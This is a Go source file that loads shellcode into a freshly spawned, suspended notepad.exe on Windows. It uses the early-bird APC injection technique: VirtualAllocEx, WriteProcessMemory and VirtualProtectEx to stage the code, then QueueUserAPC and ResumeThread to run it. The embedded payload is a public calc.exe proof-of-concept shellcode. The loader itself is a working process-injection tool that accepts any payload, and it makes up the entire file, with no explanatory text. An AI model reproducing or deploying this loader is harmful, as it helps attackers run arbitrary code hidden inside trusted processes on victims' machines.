package main

import (
	"syscall"
	"time"
	"unsafe"
)

const (
	CREATE_SUSPENDED = 0x00000004
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)

const  PROGRAM = "C:\\Windows\\System32\\notepad.exe"
func Loader(shellcode []byte){
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	QueueUserAPC := kernel32.NewProc("QueueUserAPC")
	ResumeThread := kernel32.NewProc("ResumeThread")
	procInfo := &syscall.ProcessInformation{}
	startupInfo := &syscall.StartupInfo{
		Flags:      syscall.STARTF_USESTDHANDLES | CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	appName,_ := syscall.UTF16PtrFromString(PROGRAM)
	appArgs,_ := syscall.UTF16PtrFromString("")
	syscall.CreateProcess(appName,appArgs,nil,nil,true,CREATE_SUSPENDED,nil,nil,startupInfo,procInfo)
	time.Sleep(5*time.Second)
	addr,_,_ := VirtualAllocEx.Call(uintptr(procInfo.Process),0,uintptr(len(shellcode)),MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE)
	WriteProcessMemory.Call(uintptr(procInfo.Process),addr,(uintptr)(unsafe.Pointer(&shellcode[0])),uintptr(len(shellcode)),uintptr(0))
	protect := PAGE_READWRITE
	VirtualProtectEx.Call(uintptr(procInfo.Process),addr,uintptr(len(shellcode)),PAGE_EXECUTE_READ,uintptr(unsafe.Pointer(&protect)))
	QueueUserAPC.Call(addr,uintptr(procInfo.Thread),0)
	ResumeThread.Call(uintptr(procInfo.Thread))
	syscall.CloseHandle(procInfo.Process)
	syscall.CloseHandle(procInfo.Thread)
}

func main(){
	var shellcode = []byte{
		//calc.exe https://github.com/peterferrie/win-exec-calc-shellcode
		0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
		0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
		0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
		0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
		0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
		0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
		0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
		0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
		0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
		0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
		0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
		0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
		0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
		0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
		0xd7,
	}
	Loader([]byte(shellcode))
}